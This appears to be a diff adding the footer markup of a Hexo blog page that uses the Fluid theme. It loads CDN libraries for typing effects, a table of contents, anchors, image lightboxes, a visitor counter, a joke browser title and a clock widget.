+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+
+
+  <!--下面两行是核心内容-->
+  <link  rel="stylesheet" href="/css/TrymenT-ClocK.min.css" />
+  <script  src="/js/TrymenT-ClocK.min.js" ></script>
+ 
